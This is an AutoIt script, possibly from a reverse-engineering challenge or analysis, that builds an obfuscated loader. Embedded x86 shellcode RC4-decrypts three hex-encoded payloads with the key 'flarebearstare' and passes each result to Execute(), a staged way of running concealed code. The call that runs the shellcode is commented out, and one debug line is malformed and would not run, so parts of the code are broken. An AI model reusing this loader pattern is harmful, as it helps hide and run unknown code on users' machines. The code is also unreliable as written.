#include <Constants.au3>

ConsoleWrite("GOGOGO")

$nret = dothis("0x96c581bc009905e76931875a583f97a738b764eb67f35c802194bf86123b943d1907619488a31a26cf29ba5f5e57ed5c5a37cb5d67dc2020a7e6d55cadefba32aba3ed77f0e18e41a571e74a8a7614a895d7c8827c46028761994543bf449138c65a6e7b5039792c85be5b4998c9950d2497f73cd88d186a6bffe3634bd250ec59e2", "flarebearstare", 0)
If $nret Then
	If dothis("0x96d587b8139933d17e3598505e729da736bb66aa6cfa5180289fb6845530", "flarebearstare", 1) Then
		dothis("0x9aee96b50da818d16f368556131aecfc69ef21a440f24fcc6bd1f3bd1e76db69574a6c8d81ed53688a7eaa364e53fd0700", "flarebearstare", 2)
	EndIf
EndIf

Func decrypt($data, $key, $runid)
	Local $opcode = "0xC81001006A006A005356578B551031C989C84989D7F2AE484829C88945F085C00F84DC000000B90001000088C82C0188840DEFFEFFFFE2F38365F4008365FC00817DFC000100007D478B45FC31D2F775F0920345100FB6008B4DFC0FB68C0DF0FEFFFF01C80345F425FF0000008945F48B75FC8A8435F0FEFFFF8B7DF486843DF0FEFFFF888435F0FEFFFFFF45FCEBB08D9DF0FEFFFF31FF89FA39550C76638B85ECFEFFFF4025FF0000008985ECFEFFFF89D80385ECFEFFFF0FB6000385E8FEFFFF25FF0000008985E8FEFFFF89DE03B5ECFEFFFF8A0689DF03BDE8FEFFFF860788060FB60E0FB60701C181E1FF0000008A840DF0FEFFFF8B750801D6300642EB985F5E5BC9C21000"
	Local $codebuffer = DllStructCreate("byte[" & BinaryLen($opcode) & "]")
	DllStructSetData($codebuffer, 1, $opcode)
	Local $buffer = DllStructCreate("byte[" & BinaryLen($data) & "]")
	DllStructSetData($buffer, 1, $data)
	FuncNameConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : FileWrite = ' & FileWrite & @CRLF & '>Error code: ' & @error & @CRLF) ;### Debug Console
	;DllCall("user32.dll", "none", "CallWindowProc", "ptr", DllStructGetPtr($codebuffer), "ptr", DllStructGetPtr($buffer), "int", BinaryLen($data), "str", $key, "int", 0)
	Local $ret = DllStructGetData($buffer, 1)
	$buffer = 0
	$codebuffer = 0
	Return $ret
EndFunc

Func dothis($data, $key, $runid)
	$exe = decrypt($data, $key, $runid)
	$exe = BinaryToString($exe)
	Return Execute($exe)
EndFunc
